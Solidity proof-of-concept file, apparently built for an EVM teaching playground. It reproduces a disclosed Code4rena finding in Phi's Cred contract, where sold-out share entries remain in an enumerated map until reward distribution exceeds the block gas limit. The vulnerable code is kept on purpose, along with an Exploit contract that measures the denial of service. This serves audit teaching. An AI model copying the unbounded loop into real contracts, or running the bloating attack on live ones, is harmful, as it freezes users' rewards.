// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Phi -- shareBalance bloating eventually blocks curator rewards distribution
    (Code4rena 2024-08-phi, finding #41089, H-03, reporter rare_one)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Cred._updateCuratorShareBalance sets a curator's share balance to 0 on a
    full sell instead of REMOVING the entry from the EnumerableMap. The map
    only ever grows. CuratorRewardsDistributor.distribute() enumerates EVERY
    entry ever added (including permanent zero-balance ones) via
    shareBalance[credId].at(i) in a loop bounded by shareBalance[credId].length().
    Once enough distinct addresses have ever traded a cred's shares, this
    enumeration exceeds the block gas limit and `distribute()` permanently
    reverts, freezing that cred's rewards forever.

    Because the real bug needs ~4000 distinct traders to hit a 30M-gas block
    limit (too many opcodes to trace in-browser), this file SAMPLES a smaller
    trader count, measures `distribute()`'s real marginal gas cost per
    permanently-orphaned entry, and extrapolates to the finding's own 4000
    figure to prove the DoS threshold is real -- exactly what the finding's
    own PoC does ("couldn't run all N, measured gas").
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal re-implementation of OpenZeppelin's EnumerableMap.AddressToUintMap
///      (set/tryGet/remove/length/at) sufficient to reproduce the bug.
library EnumerableMapMini {
    struct AddressToUintMap {
        address[] keys;
        mapping(address => uint256) values;
        mapping(address => uint256) indexOf; // 1-based; 0 == not present
    }

    function set(AddressToUintMap storage map, address key, uint256 value) internal {
        if (map.indexOf[key] == 0) {
            map.keys.push(key);
            map.indexOf[key] = map.keys.length;
        }
        map.values[key] = value;
    }

    function tryGet(AddressToUintMap storage map, address key) internal view returns (bool, uint256) {
        uint256 idx = map.indexOf[key];
        if (idx == 0) return (false, 0);
        return (true, map.values[key]);
    }

    function length(AddressToUintMap storage map) internal view returns (uint256) {
        return map.keys.length;
    }

    function at(AddressToUintMap storage map, uint256 index) internal view returns (address, uint256) {
        address key = map.keys[index];
        return (key, map.values[key]);
    }
}

/// @notice Reduced Cred -- faithful reduction of the curator share-balance
///         accounting in src/Cred.sol (_updateCuratorShareBalance).
contract Cred {
    using EnumerableMapMini for EnumerableMapMini.AddressToUintMap;

    mapping(uint256 => EnumerableMapMini.AddressToUintMap) private shareBalance;
    mapping(address => mapping(uint256 => bool)) private _credIdExistsPerAddress;

    /// @dev Faithful reduction of Cred._updateCuratorShareBalance (src/Cred.sol).
    function _updateCuratorShareBalance(uint256 credId_, address sender_, uint256 amount_, bool isBuy) internal {
        (, uint256 currentNum) = shareBalance[credId_].tryGet(sender_);

        if (isBuy) {
            if (currentNum == 0 && !_credIdExistsPerAddress[sender_][credId_]) {
                _credIdExistsPerAddress[sender_][credId_] = true;
            }
            shareBalance[credId_].set(sender_, currentNum + amount_);
        } else {
            if ((currentNum - amount_) == 0) {
                _credIdExistsPerAddress[sender_][credId_] = false;
            }
            // @> VULN: on a full sell the balance is SET to 0 instead of REMOVED from the
            // EnumerableMap -- the entry (and the storage slots behind it) stays forever.
            // FIX: shareBalance[credId_].remove(sender_); (only) when currentNum - amount_ == 0.
            shareBalance[credId_].set(sender_, currentNum - amount_);
        }
    }

    function buyShareCred(uint256 credId_, uint256 amount_) external {
        _updateCuratorShareBalance(credId_, msg.sender, amount_, true);
    }

    function sellShareCred(uint256 credId_, uint256 amount_) external {
        _updateCuratorShareBalance(credId_, msg.sender, amount_, false);
    }

    function shareBalanceLength(uint256 credId_) external view returns (uint256) {
        return shareBalance[credId_].length();
    }

    function shareBalanceAt(uint256 credId_, uint256 index_) external view returns (address, uint256) {
        return shareBalance[credId_].at(index_);
    }
}

/// @notice Reduced CuratorRewardsDistributor -- faithful reduction of the
///         enumeration loop in _getCuratorData/distribute (src/reward/CuratorRewardsDistributor.sol).
contract CuratorRewardsDistributor {
    Cred public cred;
    // Per-curator claimable balance (Phi's reward system is pull-based -- see the
    // real PhiRewards.withdraw() pattern referenced by the sibling finding #41087 --
    // so distribute() accrues a claimable amount per curator rather than pushing ETH).
    mapping(uint256 => mapping(address => uint256)) public pendingRewards;
    // Per-curator last-processed checkpoint -- real distributors track this to avoid
    // double-crediting a curator across overlapping distribution rounds.
    mapping(uint256 => mapping(address => uint256)) public lastProcessedAt;

    constructor(Cred cred_) {
        cred = cred_;
    }

    /// @dev Faithful reduction: enumerates every entry in shareBalance[credId_] and accrues
    ///      each curator's claimable reward, exactly like the real
    ///      distribute() -> _getCuratorData path.
    function distribute(uint256 credId_) external returns (uint256 touched, uint256 gasUsed) {
        uint256 gasStart = gasleft();
        uint256 stopIndex = cred.shareBalanceLength(credId_);
        for (uint256 i = 0; i < stopIndex; ++i) {
            // @> VULN: enumerates EVERY entry ever added, including permanent zero-balance
            // ones left behind by sellShareCred -- this is the loop that eventually exceeds
            // the block gas limit as more distinct addresses have ever traded the cred.
            (address key, uint256 shareAmount) = cred.shareBalanceAt(credId_, i);
            pendingRewards[credId_][key] += shareAmount; // per-curator reward accrual
            lastProcessedAt[credId_][key] = block.number; // per-curator processing checkpoint
        }
        gasUsed = gasStart - gasleft();
        touched = stopIndex;
    }
}

contract Exploit {
    // Sample size kept small enough to trace in-browser; the real finding needs ~4000
    // distinct traders to hit a 30M gas block limit.
    uint256 public constant SAMPLE_TRADERS = 60;
    uint256 public constant CRED_ID = 1;
    uint256 public constant REAL_TRADER_COUNT = 4000; // the finding's own PoC figure
    uint256 public constant BLOCK_GAS_LIMIT = 30_000_000; // current Ethereum block gas limit

    Cred public cred; // CREATE nonce 1
    CuratorRewardsDistributor public distributor; // CREATE nonce 2

    uint256 public perTraderGas;
    uint256 public extrapolatedGas;

    constructor() {
        cred = new Cred();
        distributor = new CuratorRewardsDistributor(cred);
    }

    /// @notice Setup step: ONE distinct trader buys 1 share then immediately sells it all,
    ///         leaving a permanent zero-balance entry behind. Called as a SEPARATE
    ///         top-level transaction per trader (Playground: one `setup.steps` entry each;
    ///         registry: a separate top-level call per trader, run with `--isolate`) --
    ///         exactly like thousands of independent trades happening over separate
    ///         transactions on mainnet, so each trader's storage slot starts genuinely COLD.
    function seedTrader() external {
        Relay r = new Relay(cred);
        r.buyThenSell(CRED_ID, 1);
    }

    function run() external {
        require(cred.shareBalanceLength(CRED_ID) == SAMPLE_TRADERS, "orphaned entries missing (call seedTrader first)");

        // One more buy-then-sell, executed HERE (inside run(), so it is captured in the
        // trace) -- this is the exact moment the vulnerable line in
        // Cred._updateCuratorShareBalance runs: a full sell SETS the balance to 0
        // instead of REMOVING the entry, leaving one more permanent orphan behind.
        cred.buyShareCred(CRED_ID, 1);
        cred.sellShareCred(CRED_ID, 1);
        require(cred.shareBalanceLength(CRED_ID) == SAMPLE_TRADERS + 1, "final orphan not recorded");

        // Measure distribute()'s REAL marginal gas cost with SAMPLE_TRADERS+1 orphaned
        // entries, each genuinely cold at the start of THIS call/transaction.
        (uint256 touched, uint256 gasSample) = distributor.distribute(CRED_ID);
        require(touched == SAMPLE_TRADERS + 1, "did not enumerate all orphans");

        perTraderGas = gasSample / (SAMPLE_TRADERS + 1);
        extrapolatedGas = perTraderGas * REAL_TRADER_COUNT;

        // HARM: extrapolated to the finding's own real-world trader count (4000), the
        // enumeration cost exceeds the block gas limit -- `distribute()` becomes
        // permanently uncallable and the cred's curator rewards are frozen forever.
        require(extrapolatedGas > BLOCK_GAS_LIMIT, "extrapolated cost does not exceed block gas limit");
    }
}

/// @dev Tiny per-trader relay so each simulated trader is a DISTINCT address inside
///      Cred's shareBalance map (cheatcode-free stand-in for vm.startPrank(trader)).
contract Relay {
    Cred public cred;

    constructor(Cred cred_) {
        cred = cred_;
    }

    function buyThenSell(uint256 credId_, uint256 amount_) external {
        cred.buyShareCred(credId_, amount_);
        cred.sellShareCred(credId_, amount_);
    }
}
